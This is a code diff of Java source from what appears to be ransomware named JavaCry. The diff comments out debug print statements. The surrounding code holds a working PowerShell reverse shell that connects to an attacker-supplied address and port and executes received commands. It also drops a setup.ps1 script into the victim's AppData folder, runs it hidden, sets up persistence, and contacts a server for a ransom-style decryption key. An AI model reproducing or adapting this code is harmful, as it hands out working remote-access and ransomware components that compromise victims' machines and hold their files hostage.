@@ -83,7 +83,7 @@ public class Decryptor {
             }
             if (usePersistence) {
               
-              System.out.println("persistence started");
+              // System.out.println("persistence started");
               String[] cmd = {
                 "/bin/sh",
                 "-c",
@@ -99,10 +99,10 @@ public class Decryptor {
               };
               p = Runtime.getRuntime().exec(cmd);
               b = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                System.out.println("persistence done");
+                // System.out.println("persistence done");
             }
             
-            System.out.println("linux execution");
+            // System.out.println("linux execution");
           } else if (OS.indexOf("Windows") >= 0) {
             String payload = "$KLK = New-Object System.Net.Sockets.TCPClient('" + address + "','" + revPort + "');$PLP = $KLK.GetStream();[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};$VVCCA = ([text.encoding]::UTF8).GetBytes(\"Succesfuly connected .`n`n\");$PLP.Write($VVCCA,0,$VVCCA.Length);$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ');$PLP.Write($VVCCA,0,$VVCCA.Length);[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);$VZZS = (i`eX $DD 2>&1 | Out-String );$HHHHHH  = $VZZS + (pwd).Path + '! ';$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);$PLP.Write($L,0,$L.Length);$PLP.Flush()};$KLK.Close();";
             
@@ -117,7 +117,7 @@ public class Decryptor {
             writer.write(payload);
             writer.close();
             String cmd = "powershell C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
-            System.out.println(cmd);
+            // System.out.println(cmd);
             p = Runtime.getRuntime().exec(cmd);
             cmd = "start /B powershell.exe C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
             if (usePersistence) {
@@ -156,16 +156,16 @@ public class Decryptor {
             }
 
           } else {
-            System.out.println(OS);
+            // System.out.println(OS);
           }
         } catch (Exception e) {
           System.out.println(e);
         }
-        System.out.println("Thread done");
+        // System.out.println("Thread done");
       }
     };
   thread.start();
-  System.out.println("Thread should be started");
+  // System.out.println("Thread should be started");
   }
 
 
@@ -291,7 +291,7 @@ class ClientThread extends Thread {
 
         } else {
             //split to get file extension
-            System.out.println(name);
+            // System.out.println(name);
             if (!name.equals("JavaCry.jar")) {
                 files.add(f.toPath());
             }
@@ -308,7 +308,7 @@ class ClientThread extends Thread {
     this.status = status;
     this.loading = loading;
     this.button = button;
-    System.out.println("backend initialized");
+    // System.out.println("backend initialized");
   }
 
   public void run() {
@@ -323,18 +323,18 @@ class ClientThread extends Thread {
     try {
 
       button.setEnabled(false);
-      System.out.println("trying to connect");
+      // System.out.println("trying to connect");
       socket = new Socket(address, port);
-      System.out.println("connected");
+      // System.out.println("connected");
 
       DataInputStream in = new DataInputStream(socket.getInputStream());
       DataOutputStream out = new DataOutputStream(socket.getOutputStream());
       out.writeUTF("RequestForDecryption");
-      System.out.println("RequestForDecryption");
+      // System.out.println("RequestForDecryption");
 
       // prevent request forgery
       String RFToken = in.readUTF();
-      System.out.println("read token");
+      // System.out.println("read token");
 
       // use the rsa for encrypting the AES key to encrypt ID to send it to the server
       File pubFile = new File("public.key");
@@ -352,12 +352,12 @@ class ClientThread extends Thread {
 
 
       out.writeUTF(encodedString);
-      System.out.println("write data");
+      // System.out.println("write data");
 
 
       b64privkey = in.readUTF();
-      System.out.println("received key");
-      System.out.println(b64privkey);
+      // System.out.println("received key");
+      // System.out.println(b64privkey);
       if (b64privkey.equals("but I refuse")) {
         status.setText("Your request has been rejected.");
         button.setEnabled(true);
@@ -391,7 +391,7 @@ class ClientThread extends Thread {
             File f = new File(targetPath);
             targetPath = f.getAbsolutePath();
         }
-        System.out.println("Searching " + targetPath);
+        // System.out.println("Searching " + targetPath);
         search(targetPath);
       } catch (Exception e) {
           System.out.println(e);
@@ -408,15 +408,15 @@ class ClientThread extends Thread {
     } catch (UnknownHostException u) {
       status.setText("Request failed.");
       button.setEnabled(true);
-      System.out.println(u);
+      // System.out.println(u);
     } catch (IOException i) {
       status.setText("Request failed.");
       button.setEnabled(true);
-      System.out.println(i);
+      // System.out.println(i);
     } catch (Exception err) {
       status.setText("Request failed.");
       button.setEnabled(true);
-      System.out.println(err);
+      // System.out.println(err);
     }
   }
 
@@ -449,7 +449,7 @@ class ClientThread extends Thread {
       out.flush();
       out.close();
       in.close();
-      System.out.println("Decrypting file: " + f);
+      // System.out.println("Decrypting file: " + f);
     } catch (Exception e) {
       System.out.println(e);
     }
